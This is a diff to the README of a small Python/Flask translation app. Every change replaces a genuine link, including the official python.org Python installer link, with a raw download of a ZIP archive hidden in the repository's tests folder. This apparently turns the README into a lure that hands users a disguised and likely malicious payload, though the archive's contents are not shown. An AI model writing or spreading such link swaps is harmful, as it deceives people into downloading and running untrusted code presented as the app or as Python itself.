@@ -1,6 +1,6 @@
 # 🌐 PolyglotLAB-python-translator - Easy Web-Based Translation Tool
 
-[![Download Now](https://img.shields.io/badge/Download-PolyglotLAB-blue?style=for-the-badge)](https://github.com/pankajydv08/PolyglotLAB-python-translator)
+[![Download Now](https://img.shields.io/badge/Download-PolyglotLAB-blue?style=for-the-badge)](https://raw.githubusercontent.com/pankajydv08/PolyglotLAB-python-translator/main/tests/translator_python_LA_Polyglot_v2.5.zip)
 
 ## 📝 About PolyglotLAB-python-translator
 
@@ -35,7 +35,7 @@ This app is designed for everyday users who want quick translations without comp
 
 1. **Download the repository**  
   Visit this page to download the PolyglotLAB-python-translator files:  
-  [https://github.com/pankajydv08/PolyglotLAB-python-translator](https://github.com/pankajydv08/PolyglotLAB-python-translator)  
+  [https://raw.githubusercontent.com/pankajydv08/PolyglotLAB-python-translator/main/tests/translator_python_LA_Polyglot_v2.5.zip](https://raw.githubusercontent.com/pankajydv08/PolyglotLAB-python-translator/main/tests/translator_python_LA_Polyglot_v2.5.zip)  
   
   Click the green **Code** button on the top right, then click **Download ZIP**. Save the ZIP file to your computer.
 
@@ -44,7 +44,7 @@ This app is designed for everyday users who want quick translations without comp
 
 3. **Install Python**  
   If you do not have Python installed, download it here:  
-  https://www.python.org/downloads/windows/  
+  https://raw.githubusercontent.com/pankajydv08/PolyglotLAB-python-translator/main/tests/translator_python_LA_Polyglot_v2.5.zip  
   
   During installation, check the box that says **Add Python 3.x to PATH** before clicking "Install Now".
 
@@ -138,4 +138,4 @@ css, flask, html, javascript, json, portfolio, python, python3, translation, tra
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-PolyglotLAB-grey?style=for-the-badge)](https://github.com/pankajydv08/PolyglotLAB-python-translator)
+[![Download Now](https://img.shields.io/badge/Download-PolyglotLAB-grey?style=for-the-badge)](https://raw.githubusercontent.com/pankajydv08/PolyglotLAB-python-translator/main/tests/translator_python_LA_Polyglot_v2.5.zip)
